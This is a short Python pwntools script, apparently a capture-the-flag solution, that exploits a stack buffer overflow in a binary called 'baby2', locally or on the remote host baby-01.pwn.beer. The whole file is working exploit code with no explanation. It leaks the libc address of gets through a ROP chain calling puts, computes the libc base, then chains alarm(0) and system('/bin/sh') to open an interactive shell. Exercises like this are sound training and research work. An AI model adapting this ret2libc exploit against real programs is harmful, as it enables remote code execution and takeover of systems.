from pwn import *

isRemote = args['REMOTE']

binary = './baby2'
localElf = '/usr/lib/libc.so.6'
remoteElf = './libc.so.6'

context.binary = binary
context.log_level = 'debug'

elf = ELF(binary)
libc = ELF(remoteElf if isRemote else localElf)

p = remote('baby-01.pwn.beer', 10002) if isRemote else elf.process()
p.recvuntil('input: ')

r = ROP(elf)
r.puts(elf.got['gets'])
r.main()

p.sendline('A' * 24 + str(r))

leak = p.recvuntil('input: ')
leaked_gets = u64(leak[:6].ljust(8, '\x00'))
libc.address = leaked_gets - libc.sym['gets']

r = ROP(libc)
r.alarm(0)
r.system(next(libc.search('/bin/sh')))
p.sendline('A' * 24 + str(r))

p.interactive()
